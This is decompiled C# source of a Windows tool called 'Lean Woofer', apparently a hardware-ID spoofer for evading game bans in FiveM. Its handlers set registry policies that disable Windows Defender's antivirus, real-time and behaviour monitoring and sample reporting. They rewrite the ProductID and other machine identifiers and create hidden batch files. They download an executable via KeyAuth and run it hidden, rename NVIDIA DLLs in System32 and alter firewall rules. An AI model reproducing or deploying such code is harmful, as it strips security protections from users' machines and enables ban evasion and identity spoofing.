			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text2 = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text2))
				{
					streamWriter2.WriteLine("netsh int ip reset");
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text2;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process2.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
			Thread.Sleep(2000);
			string path2 = "C:\\Program Files\\Sounds";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
			{
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			else
			{
				string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
				string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
				WebClient webClient = new WebClient();
				webClient.DownloadFile(address, fileName);
				File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
				new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
			}
			MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Lean Woofer - Fast CFX v2", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			File.Delete("C:\\Program Files\\Sounds\\fivemspoofed.wav");
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00009BE0 File Offset: 0x00007DE0
		public static void ClickUnban()
		{
			List<Process> list = new List<Process>();
			d d = new d();
			d.b();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				list.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.FiveM();
			Main.bi();
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00009CB8 File Offset: 0x00007EB8
		public static string GenID(int length)
		{
			string element = "123457869";
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.b)).ToArray<char>());
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00009D04 File Offset: 0x00007F04
		public static string DiskGen(int length)
		{
			string element = "12345786789";
			return new string(Enumerable.Repeat<string>(element, length).Select(new Func<string, char>(Main.<>c.<>9.c)).ToArray<char>());
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000223C File Offset: 0x0000043C
		private void bl(object sender, EventArgs e)
		{
			this.ba.BringToFront();
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00002198 File Offset: 0x00000398
		private void bm(object sender, EventArgs e)
		{
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00009D50 File Offset: 0x00007F50
		private void bn(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			Main.HWIDclick();
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
			Main.InstallDate();
			Main.Disk();
			Main.HWIDclick();
			Main.XBOXclick();
			Main.PCclick();
			Main.Diskclick();
			Main.bi();
			Main.SpoofPCName();
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				Process.Start("C:\\Program Files\\Win64\\net.bat");
			}
			else
			{
				string text = "C:\\Program Files\\Win64\\net.bat";
				using (StreamWriter streamWriter = File.CreateText(text))
				{
					streamWriter.WriteLine("netsh int ip reset");
				}
				Process process = new Process();
				process.StartInfo.FileName = text;
				this.d.Add(process);
				File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
				process.Start();
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
			{
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
			}
			string text2 = this.bm.Text;
			string path2 = "C:\\Program Files\\Unlisted";
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
			{
				string text3 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter2 = File.CreateText(text3))
				{
					streamWriter2.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process2 = new Process();
				process2.StartInfo.FileName = text3;
				this.d.Add(process2);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process2.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			else
			{
				byte[] bytes = Login.KeyAuthApp.download("558460");
				File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes);
				File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
				Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
				Thread.Sleep(500);
				string text4 = "C:\\Program Files\\Unlisted\\change.bat";
				using (StreamWriter streamWriter3 = File.CreateText(text4))
				{
					streamWriter3.WriteLine(string.Concat(new string[]
					{
						"volumeid.exe ",
						text2,
						": ",
						Main.DiskGen(4),
						"-",
						Main.DiskGen(4),
						" -nobanner"
					}));
				}
				Process process3 = new Process();
				process3.StartInfo.FileName = text4;
				this.d.Add(process3);
				File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
				process3.Start();
				File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
				File.Delete("C:\\Program Files\\Unlisted\\change.bat");
				Directory.Delete(path2);
			}
			MessageBox.Show("Spoofed All System", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000A0EC File Offset: 0x000082EC
		private void bo(object sender, EventArgs e)
		{
			d d = new d();
			d.b();
			if (File.Exists("C:\\Windows\\System32\\nvml.dll"))
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Cleaned Nvidia Logger!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000093 RID: 147 RVA: 0x00002287 File Offset: 0x00000487
		private void bp(object sender, EventArgs e)
		{
			Main.FiveM();
			Main.ClickUnban();
			MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Lean Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000094 RID: 148 RVA: 0x0000A158 File Offset: 0x00008358
		private void bq(object sender, EventArgs e)
		{
			try
			{
				string path = "C:\\Program Files\\Saved\\imgsave.gif";
				if (File.Exists(path))
				{
					File.Delete(path);
				}
				Thread.Sleep(1000);
				string path2 = "C:\\Program Files\\Saved";
				if (!Directory.Exists(path2))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path2);
					directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Saved");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path2);
					directoryInfo2.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				}
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.s.Image = new Bitmap(openFileDialog.FileName);
					File.Copy(openFileDialog.FileName, "C:\\Program Files\\Saved\\imgsave.gif");
				}
			}
			catch
			{
				MessageBox.Show("There was an error, try again later!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x06000095 RID: 149 RVA: 0x0000A230 File Offset: 0x00008430
		private void br(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Pictures";
			try
			{
				string text = "https://cdn.discordapp.com/attachments/954439038109102182/968512955140431912/lean_animated_logo.gif";
				string text2 = "C:\\Program Files\\Pictures\\leanlogo.gif";
				if (!Directory.Exists(path))
				{
					Directory.CreateDirectory(path);
				}
				if (File.Exists(text2))
				{
					this.s.Image = new Bitmap(text2);
				}
				else
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(text, text2);
					this.s.Image = new Bitmap(text);
				}
				string path2 = "C:\\Program Files\\Pictures\\imgsave.gif";
				File.Delete(path2);
				Thread.Sleep(50);
				this.s.Image = new Bitmap(text2);
				Thread.Sleep(2000);
				DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\Saved");
				foreach (FileInfo fileInfo in directoryInfo.GetFiles())
				{
					fileInfo.Delete();
				}
				foreach (DirectoryInfo directoryInfo2 in directoryInfo.GetDirectories())
				{
					directoryInfo2.Delete(true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00002198 File Offset: 0x00000398
		private void bs(object sender, EventArgs e)
		{
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00002198 File Offset: 0x00000398
		private void bt(object sender, EventArgs e)
		{
		}

		// Token: 0x06000098 RID: 152 RVA: 0x00002198 File Offset: 0x00000398
		private void bu(object sender, EventArgs e)
		{
		}

		// Token: 0x06000099 RID: 153 RVA: 0x0000A344 File Offset: 0x00008544
		private void bv(object sender, EventArgs e)
		{
			if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
			{
				File.Move("C:\\Windows\\System32\\nvml2.dll", "C:\\Windows\\System32\\nvml.dll");
				File.Move("C:\\Windows\\System32\\nvmld2.dll", "C:\\Windows\\System32\\nvmld.dll");
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x0000A37C File Offset: 0x0000857C
		private void bw(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
				}
			}.Start();
			MessageBox.Show("Fixed FiveM Bypass Error", "Lean Woofer", MessageBoxButtons.OK);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x0000A438 File Offset: 0x00008638
		private void bx()
		{
			this.e = new Container();
			Animation animation = new Animation();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Main));
			this.f = new SiticoneDragControl(this.e);
			this.g = new SiticoneControlBox();
			this.h = new SiticoneControlBox();
			this.i = new SiticoneTransition();
			this.j = new Label();
			this.k = new Label();
			this.n = new SiticoneLabel();
			this.m = new SiticoneLabel();
			this.p = new SiticoneLabel();
			this.r = new Panel();
			this.s = new PictureBox();
			this.u = new SiticoneShadowPanel();
			this.bp = new SiticoneRoundedButton();
			this.bk = new SiticoneRoundedButton();
			this.ad = new SiticoneRoundedButton();
			this.ae = new SiticoneRoundedButton();
			this.af = new SiticoneRoundedButton();
			this.ag = new SiticoneRoundedButton();
			this.ah = new SiticoneRoundedButton();
			this.ai = new SiticoneRoundedButton();
			this.aj = new SiticoneRoundedButton();
			this.v = new SiticoneLabel();
			this.w = new PictureBox();
			this.x = new Label();
			this.t = new SiticoneLabel();
			this.z = new SiticoneOSToggleSwith();
			this.y = new SiticoneLabel();
			this.ak = new SiticoneShadowPanel();
			this.bw = new SiticoneLabel();
			this.bx = new SiticoneTextBox();
			this.ap = new SiticoneLabel();
			this.ao = new SiticoneRoundedButton();
			this.al = new SiticoneLabel();
			this.am = new PictureBox();
			this.an = new Label();
			this.aq = new SiticoneComboBox();
			this.ar = new SiticoneShadowPanel();
			this.cb = new SiticoneLabel();
			this.ca = new SiticoneLabel();
			this.bz = new SiticoneButton();
			this.bu = new SiticoneLabel();
			this.bt = new SiticoneLabel();
			this.bs = new SiticoneButton();
			this.bl = new SiticoneLabel();
			this.bm = new SiticoneTextBox();
			this.bg = new SiticoneButton();
			this.@as = new SiticoneLabel();
			this.at = new PictureBox();
			this.au = new Label();
			this.av = new Label();
			this.ay = new Label();
			this.az = new SiticoneLabel();
			this.ba = new SiticoneShadowPanel();
			this.br = new SiticoneRoundedButton();
			this.bq = new SiticoneRoundedButton();
			this.bo = new SiticoneLabel();
			this.bj = new SiticoneRoundedButton();
			this.bi = new SiticoneRoundedButton();
			this.bh = new SiticoneRoundedButton();
			this.be = new SiticoneRoundedButton();
			this.bf = new SiticoneRoundedButton();
			this.bb = new SiticoneLabel();
			this.bc = new PictureBox();
			this.bd = new Label();
			this.bn = new SiticoneGradientButton();
			this.aa = new SiticoneGradientButton();
			this.ab = new SiticoneGradientButton();
			this.ac = new SiticoneGradientButton();
			this.bv = new SiticoneLabel();
			this.l = new SiticoneShadowForm(this.e);
			this.o = new System.Windows.Forms.Timer(this.e);
			this.aw = new PageSetupDialog();
			this.ax = new System.Windows.Forms.Timer(this.e);
			this.q = new BindingSource(this.e);
			this.by = new System.Windows.Forms.Timer(this.e);
			this.r.SuspendLayout();
			((ISupportInitialize)this.s).BeginInit();
			this.u.SuspendLayout();
			((ISupportInitialize)this.w).BeginInit();
			this.ak.SuspendLayout();
			((ISupportInitialize)this.am).BeginInit();
			this.ar.SuspendLayout();
			((ISupportInitialize)this.at).BeginInit();
			this.ba.SuspendLayout();
			((ISupportInitialize)this.bc).BeginInit();
			((ISupportInitialize)this.q).BeginInit();
			base.SuspendLayout();
			this.f.TargetControl = this;
			this.g.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.g.BorderRadius = 10;
			this.i.SetDecoration(this.g, 0);
			this.g.FillColor = Color.FromArgb(26, 32, 54);
			this.g.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
			this.g.HoveredState.IconColor = Color.White;
			this.g.HoveredState.Parent = this.g;
			this.g.IconColor = Color.White;
			this.g.Location = new Point(613, 4);
			this.g.Name = "siticoneControlBox1";
			this.g.ShadowDecoration.Parent = this.g;
			this.g.Size = new Size(45, 29);
			this.g.TabIndex = 1;
			this.g.Click += this.a;
			this.h.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.h.BorderRadius = 10;
			this.h.ControlBoxType = 0;
			this.i.SetDecoration(this.h, 0);
			this.h.FillColor = Color.FromArgb(26, 32, 54);
			this.h.HoveredState.Parent = this.h;
			this.h.IconColor = Color.White;
			this.h.Location = new Point(568, 4);
			this.h.Name = "siticoneControlBox2";
			this.h.ShadowDecoration.Parent = this.h;
			this.h.Size = new Size(45, 29);
			this.h.TabIndex = 2;
			this.i.AnimationType = 1;
			this.i.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (PointF)componentResourceManager.GetObject("animation1.BlindCoeff");
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (PointF)componentResourceManager.GetObject("animation1.MosaicCoeff");
			animation.MosaicShift = (PointF)componentResourceManager.GetObject("animation1.MosaicShift");
			animation.MosaicSize = 0;
			animation.Padding = new Padding(50);
			animation.RotateCoeff = 1f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (PointF)componentResourceManager.GetObject("animation1.ScaleCoeff");
			animation.SlideCoeff = (PointF)componentResourceManager.GetObject("animation1.SlideCoeff");
			animation.TimeCoeff = 0f;
			animation.TransparencyCoeff = 1f;
			this.i.DefaultAnimation = animation;
			this.j.AutoSize = true;
			this.i.SetDecoration(this.j, 0);
			this.j.Font = new Font("Segoe UI Light", 10f);
			this.j.ForeColor = Color.White;
			this.j.Location = new Point(-1, 136);
			this.j.Name = "label1";
			this.j.Size = new Size(0, 19);
			this.j.TabIndex = 22;
			this.k.AutoSize = true;
			this.i.SetDecoration(this.k, 0);
			this.k.Font = new Font("Segoe UI Semibold", 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.k.ForeColor = Color.White;
			this.k.Location = new Point(14, 7);
			this.k.Margin = new Padding(2, 0, 2, 0);
			this.k.Name = "label2";
			this.k.Size = new Size(89, 19);
			this.k.TabIndex = 27;
			this.k.Text = "Lean Woofer";
			this.n.BackColor = Color.Transparent;
			this.i.SetDecoration(this.n, 0);
			this.n.Font = new Font("Segoe UI", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.n.ForeColor = Color.White;
			this.n.Location = new Point(51, 5);
			this.n.Margin = new Padding(2);
			this.n.Name = "key";
			this.n.Size = new Size(115, 23);
			this.n.TabIndex = 37;
			this.n.Text = "usernameLabel";
			this.n.Click += this.e;
			this.m.BackColor = Color.Transparent;
			this.i.SetDecoration(this.m, 0);
			this.m.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m.ForeColor = Color.Red;
			this.m.Location = new Point(51, 30);
			this.m.Margin = new Padding(2);
			this.m.Name = "subscription";
			this.m.Size = new Size(95, 15);
			this.m.TabIndex = 39;
			this.m.Text = "subscriptionLabel";
			this.m.Click += this.h;
			this.p.BackColor = Color.Transparent;
			this.i.SetDecoration(this.p, 0);
			this.p.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.p.ForeColor = Color.White;
			this.p.Location = new Point(159, 295);
			this.p.Margin = new Padding(2);
			this.p.Name = "version";
			this.p.Size = new Size(63, 15);
			this.p.TabIndex = 51;
			this.p.Text = "Version: 1.0";
			this.p.Click += this.u;
			this.r.BackColor = Color.FromArgb(26, 32, 54);
			this.r.Controls.Add(this.m);
			this.r.Controls.Add(this.n);
			this.r.Controls.Add(this.s);
			this.i.SetDecoration(this.r, 0);
			this.r.Location = new Point(11, 34);
			this.r.Name = "panel2";
			this.r.Size = new Size(175, 53);
			this.r.TabIndex = 59;
			this.r.Paint += this.t;
			this.i.SetDecoration(this.s, 0);
			this.s.Image = Resources.lean_woofer;
			this.s.Location = new Point(3, 3);
			this.s.Name = "pictureBox1";
			this.s.Size = new Size(43, 45);
			this.s.SizeMode = PictureBoxSizeMode.Zoom;
			this.s.TabIndex = 10;
			this.s.TabStop = false;
			this.s.Click += this.bq;
			this.u.BackColor = Color.Transparent;
			this.u.Controls.Add(this.bp);
			this.u.Controls.Add(this.bk);
			this.u.Controls.Add(this.ad);
			this.u.Controls.Add(this.ae);
			this.u.Controls.Add(this.af);
			this.u.Controls.Add(this.ag);
			this.u.Controls.Add(this.ah);
			this.u.Controls.Add(this.ai);
			this.u.Controls.Add(this.aj);
			this.u.Controls.Add(this.v);
			this.u.Controls.Add(this.w);
			this.u.Controls.Add(this.x);
			this.i.SetDecoration(this.u, 0);
			this.u.FillColor = Color.FromArgb(25, 30, 50);
			this.u.Location = new Point(195, 34);
			this.u.Name = "spooferpanel";
			this.u.ShadowColor = Color.Black;
			this.u.Size = new Size(455, 311);
			this.u.TabIndex = 66;
			this.u.Paint += this.r;
			this.bp.BorderColor = Color.DarkRed;
			this.bp.BorderThickness = 1;
			this.bp.CheckedState.Parent = this.bp;
			this.bp.CustomImages.Parent = this.bp;
			this.i.SetDecoration(this.bp, 0);
			this.bp.FillColor = Color.FromArgb(25, 30, 50);
			this.bp.Font = new Font("Segoe UI", 9f);
			this.bp.ForeColor = Color.Red;
			this.bp.HoveredState.Parent = this.bp;
			this.bp.Location = new Point(54, 260);
			this.bp.Name = "siticoneRoundedButton7";
			this.bp.ShadowDecoration.Parent = this.bp;
			this.bp.Size = new Size(346, 29);
			this.bp.TabIndex = 72;
			this.bp.Text = "Spoof All";
			this.bp.Click += this.bn;
			this.bk.BorderColor = Color.DarkRed;
			this.bk.BorderThickness = 1;
			this.bk.CheckedState.Parent = this.bk;
			this.bk.CustomImages.Parent = this.bk;
			this.i.SetDecoration(this.bk, 0);
			this.bk.FillColor = Color.FromArgb(25, 30, 50);
			this.bk.Font = new Font("Segoe UI", 9f);
			this.bk.ForeColor = Color.Red;
			this.bk.HoveredState.Parent = this.bk;
			this.bk.Location = new Point(277, 210);
			this.bk.Name = "siticoneRoundedButton10";
			this.bk.ShadowDecoration.Parent = this.bk;
			this.bk.Size = new Size(123, 29);
			this.bk.TabIndex = 71;
			this.bk.Text = "Spoof Logs";
			this.bk.Click += this.at;
			this.ad.BorderColor = Color.DarkRed;
